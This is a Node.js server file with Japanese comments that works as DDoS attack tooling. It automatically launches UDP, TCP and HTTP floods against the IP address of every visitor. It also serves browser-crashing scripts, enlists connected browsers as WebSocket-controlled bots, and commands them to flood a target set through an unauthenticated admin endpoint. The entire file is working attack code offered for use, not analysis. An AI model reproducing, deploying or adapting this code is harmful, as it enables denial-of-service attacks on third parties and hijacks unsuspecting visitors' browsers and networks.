const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const net = require('net');
const dgram = require('dgram');

// デフォルトDDoSターゲット
const DEFAULT_DDOS_TARGET = 'http://localhost:3000';

// ============================================
// IP攻撃エンジン
// ============================================
const attackingIPs = new Map();

function attackIP(targetIP) {
    if (attackingIPs.has(targetIP)) return;
    
    attackingIPs.set(targetIP, {
        startTime: Date.now(),
        udpPackets: 0,
        tcpConnections: 0,
        httpRequests: 0
    });
    
    const stats = attackingIPs.get(targetIP);
    
    console.log(`[⚡] IP攻撃開始: ${targetIP}`);
    
    // UDPフラッド（帯域飽和）
    function udpFlood() {
        if (!attackingIPs.has(targetIP)) return;
        
        const client = dgram.createSocket('udp4');
        const message = Buffer.alloc(65500, 'X');
        
        function sendUDP() {
            if (!attackingIPs.has(targetIP)) {
                client.close();
                return;
            }
            
            for (let i = 0; i < 100; i++) {
                client.send(message, 80, targetIP, (err) => {
                    if (!err) stats.udpPackets++;
                });
            }
        }
        
        const interval = setInterval(sendUDP, 0);
        
        setTimeout(() => {
            clearInterval(interval);
            client.close();
            if (attackingIPs.has(targetIP)) udpFlood();
        }, 10000);
    }
    
    // TCPフラッド（接続テーブル枯渇）
    function tcpFlood() {
        if (!attackingIPs.has(targetIP)) return;
        
        const sockets = [];
        
        function createTCP() {
            if (!attackingIPs.has(targetIP)) {
                sockets.forEach(s => s.destroy());
                return;
            }
            
            const socket = new net.Socket();
            socket.setTimeout(3000);
            
            socket.connect(80, targetIP, () => {
                stats.tcpConnections++;
                socket.destroy();
                const index = sockets.indexOf(socket);
                if (index > -1) sockets.splice(index, 1);
            });
            
            socket.on('error', () => {
                socket.destroy();
                const index = sockets.indexOf(socket);
                if (index > -1) sockets.splice(index, 1);
            });
            
            socket.on('timeout', () => {
                socket.destroy();
                const index = sockets.indexOf(socket);
                if (index > -1) sockets.splice(index, 1);
            });
            
            sockets.push(socket);
        }
        
        function maintainConnections() {
            if (!attackingIPs.has(targetIP)) {
                sockets.forEach(s => s.destroy());
                return;
            }
            
            while (sockets.length < 200) {
                createTCP();
            }
        }
        
        const interval = setInterval(maintainConnections, 0);
        
        setTimeout(() => {
            clearInterval(interval);
            sockets.forEach(s => s.destroy());
            if (attackingIPs.has(targetIP)) tcpFlood();
        }, 10000);
    }
    
    // HTTPフラッド
    function httpFlood() {
        if (!attackingIPs.has(targetIP)) return;
        
        function sendHTTP() {
            if (!attackingIPs.has(targetIP)) return;
            
            const req = http.get({
                host: targetIP,
                port: 80,
                path: '/?flood=' + Math.random(),
                timeout: 3000,
                headers: {
                    'User-Agent': 'Mozilla/5.0',
                    'Connection': 'keep-alive'
                }
            }, () => {
                stats.httpRequests++;
            });
            
            req.on('error', () => {});
        }
        
        function floodHTTP() {
            if (!attackingIPs.has(targetIP)) return;
            
            for (let i = 0; i < 200; i++) {
                sendHTTP();
            }
        }
        
        const interval = setInterval(floodHTTP, 0);
        
        setTimeout(() => {
            clearInterval(interval);
            if (attackingIPs.has(targetIP)) httpFlood();
        }, 10000);
    }
    
    // 全攻撃開始
    udpFlood();
    tcpFlood();
    httpFlood();
    
    // 30秒ごとに状態報告
    const reportInterval = setInterval(() => {
        if (!attackingIPs.has(targetIP)) {
            clearInterval(reportInterval);
            return;
        }
        
        const duration = Math.floor((Date.now() - stats.startTime) / 1000);
        console.log(`[📊] ${targetIP} | ${duration}秒 | UDP:${stats.udpPackets} TCP:${stats.tcpConnections} HTTP:${stats.httpRequests}`);
    }, 30000);
}

// ============================================
// DDoS司令塔
// ============================================
let currentTarget = DEFAULT_DDOS_TARGET;

function startDDoS(target) {
    currentTarget = target;
    
    console.log(`[⚡] DDoS開始: ${target}`);
    console.log(`[📊] 参加ボット数: ${wss.clients.size}`);
    
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({
                command: 'ddos',
                target: target
            }));
        }
    });
}

// ============================================
// HTTPサーバー
// ============================================
const server = http.createServer((req, res) => {
    // アクセスしてきたIPを取得して自動攻撃
    const ip = req.connection.remoteAddress.replace('::ffff:', '');
    attackIP(ip);
    
    if (req.url === '/' || req.url.startsWith('/?') || req.url === '/index.html') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(fs.readFileSync('index.html'));
    } else if (req.url === '/attack.js') {
        res.writeHead(200, { 'Content-Type': 'application/javascript' });
        res.end(fs.readFileSync('attack.js'));
    } else if (req.url.startsWith('/admin/ddos?target=')) {
        const target = req.url.split('target=')[1].split('&')[0];
        startDDoS(target);
        res.end('DDoS開始: ' + target);
    } else if (req.url === '/admin/stats') {
        const attackStats = [];
        attackingIPs.forEach((value, key) => {
            attackStats.push({
                ip: key,
                duration: Math.floor((Date.now() - value.startTime) / 1000),
                udpPackets: value.udpPackets,
                tcpConnections: value.tcpConnections,
                httpRequests: value.httpRequests
            });
        });
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            bots: wss.clients.size,
            ddosTarget: currentTarget,
            attackingIPs: attackStats
        }, null, 2));
    } else {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('OK');
    }
});

// ============================================
// WebSocketサーバー
// ============================================
const wss = new WebSocket.Server({ server, path: '/ws' });

wss.on('connection', (ws, req) => {
    const ip = req.connection.remoteAddress.replace('::ffff:', '');
    
    console.log(`[+] 接続: ${ip} | 総ボット数: ${wss.clients.size}`);
    
    // アクセスしてきたIPに自動攻撃
    attackIP(ip);
    
    // ブラウザクラッシャー開始
    ws.send(JSON.stringify({
        command: 'attack'
    }));
    
    // 全員自動でDDoS参加
    ws.send(JSON.stringify({
        command: 'ddos',
        target: currentTarget
    }));
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            if (msg.type === 'ping') {
                ws.send(JSON.stringify({ type: 'pong' }));
            }
        } catch(e) {}
    });
    
    ws.on('close', () => {
        console.log(`[-] 切断: ${ip} | 総ボット数: ${wss.clients.size}`);
    });
    
    ws.on('error', () => {});
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`サーバー起動: ${PORT}`);
});
